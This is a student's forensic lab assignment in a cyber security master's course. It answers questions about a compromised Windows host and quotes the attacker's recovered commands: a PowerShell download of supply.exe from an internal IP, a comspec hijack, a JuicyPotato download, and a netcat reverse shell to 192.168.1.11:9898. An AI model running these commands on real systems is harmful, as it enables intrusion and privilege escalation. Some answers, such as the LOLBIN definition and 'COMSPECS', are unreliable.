@@ -1,0 +1,53 @@
+TA2 ABHILASHA CHOUDHARY IRM&TI
+School of Cyber Security and Digital Forensics
+M. Tech Cyber Security
+NAME – ABHILASHA CHOUDHARY
+ENROLLMENT NO. – 012300300006002004
+SUBJECT – IRM&TI
+UNDER GUIDANCE – MR. RAMYA SHAH
+TA2 ABHILASHA CHOUDHARY IRM&TI
+Activity 1:
+1. Which file granted the attacker access?
+C:\\Users\\IEUser\\Downloads\\updater.hta
+C:\\Users\\IEUser\\Downloads\\updater.hta:Zone.Identifier
+Answer: C:\\Users\\IEUser\\Downloads\\updater.hta
+2. Which PowerShell cmdlet is employed for malware file retrieval, and what is
+the associated port?
+"powershell -c INvoke-WebRequest -Uri
+http://192.168.1.11:6969/supply.exe -OutFile
+C:\\Windows\\Temp\\supply.exe"
+Answer: PORT: 6969
+3. What's the identifier of the environment variable established by the attacker?
+Note: comspec sets environment variables
+cmd \\c set comspec=C:\\windows\\temp\\supply.exe
+Answer: VARIABLE = COMSPECS
+4. Which process serves as a Living Off the Land Binary (LOLBIN) for running
+malicious commands?
+Note: Living Off the Land Binary - any malicious file that attaches itself to another
+process
+Answer: ParentCommandLine: "ftp"
+5. The malware executed several identical commands simultaneously. What was
+the initial command executed?
+Answer- "CommandLine": "C:\\windows\\temp\\supply.exe /c
+\"ipconfig\"\n"
+TA2 ABHILASHA CHOUDHARY IRM&TI
+"CommandLine": "C:\\windows\\temp\\supply.exe /c
+\"whoami\"\n"
+"CommandLine": "C:\\windows\\temp\\supply.exe /c \"whoami
+/priv\"\n"
+6. By examining the dependency events related to the malware, can you discern
+the programming language in which the malware is authored?
+Answer: Python 2.7
+7. Following that, the malware proceeds to acquire a new file. Can you determine
+the complete URL from which the file is being downloaded?
+Answer: -Uri
+https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyP
+otato.exe -OutFile
+C:\\Windows\\Temp\\juice.exe\"\n",
+8. Which port does the attacker endeavor to utilize for establishing a reverse
+shell?
+Answer- 9999
+9898
+C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a
+\"192.168.1.11 9898 -e cmd.exe\" -t t -c
+{B91D5831-B1BD-4608-8198-D72E155020F7}\"\n",
